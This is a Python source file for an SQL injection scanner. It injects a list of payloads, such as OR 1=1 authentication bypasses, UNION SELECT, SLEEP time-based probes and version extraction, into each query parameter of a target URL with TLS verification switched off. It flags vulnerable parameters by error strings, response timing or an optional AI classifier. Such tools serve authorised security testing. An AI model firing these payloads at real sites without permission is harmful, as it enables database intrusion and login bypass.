import requests
import time
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore
from config import TIMEOUT

class SQLIScanner:
    def __init__(self, target, ai_detector=None):
        self.target = target
        self.ai_detector = ai_detector
        self.payloads = self.load_payloads()
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
    
    def load_payloads(self):
        """Load SQL injection payloads"""
        return [
            ("'", "Single quote"),
            ("' OR '1'='1", "OR injection"),
            ("' OR 1=1--", "OR injection with comment"),
            ("1' AND '1'='1", "AND injection"),
            ("1' AND SLEEP(5)--", "Time-based"),
            ("' UNION SELECT NULL--", "Union-based"),
            ("' AND 1=CONVERT(int, @@version)--", "Version extraction"),
            ("' OR 1=1#", "OR with hash"),
            ("')); SELECT SLEEP(5)--", "Stacked query"),
            ("admin'--", "Auth bypass"),
            ("1' ORDER BY 1--", "Column count"),
        ]
    
    def scan(self, url):
        """Scan URL for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            # Also test POST forms if any (simplified)
            return vulnerabilities
        
        for param in params.keys():
            for payload, payload_type in self.payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
                
                try:
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=TIMEOUT, verify=False)
                    response_time = time.time() - start_time
                    
                    # Check for SQL errors
                    sql_indicators = [
                        'mysql', 'sql', 'syntax', 'oracle', 'postgresql', 
                        'mariadb', 'mongodb', 'query', 'fetch', 'mysqli',
                        'odbc', 'driver', 'microsoft', 'nativeclient',
                        'sqlite', 'database error', 'division by zero',
                        'unclosed quotation mark', 'warning: mysql'
                    ]
                    
                    is_vulnerable = any(ind in response.text.lower() for ind in sql_indicators)
                    
                    # Time-based detection
                    if not is_vulnerable and 'SLEEP' in payload and response_time > 5:
                        is_vulnerable = True
                    
                    # AI detection
                    if self.ai_detector and not is_vulnerable:
                        is_vulnerable, confidence = self.ai_detector.predict(response.text)
                        if confidence < 0.75:
                            is_vulnerable = False
                    
                    if is_vulnerable:
                        vuln = {
                            'type': 'SQL Injection',
                            'url': test_url[:200],
                            'parameter': param,
                            'payload': payload,
                            'severity': 'High',
                            'evidence': f'SQL error pattern detected (Type: {payload_type})'
                        }
                        vulnerabilities.append(vuln)
                        print(f"{Fore.RED}[!] SQLi Found: {test_url[:100]}")
                        
                        time.sleep(0.3)  # Rate limiting
                        
                except requests.exceptions.Timeout:
                    if 'SLEEP' in payload:
                        vuln = {
                            'type': 'SQL Injection (Time-based)',
                            'url': test_url[:200],
                            'parameter': param,
                            'payload': payload,
                            'severity': 'High',
                            'evidence': 'Time-based injection detected (request timeout)'
                        }
                        vulnerabilities.append(vuln)
                        print(f"{Fore.RED}[!] SQLi (Time-based) Found: {test_url[:100]}")
                except:
                    pass
        
        return vulnerabilities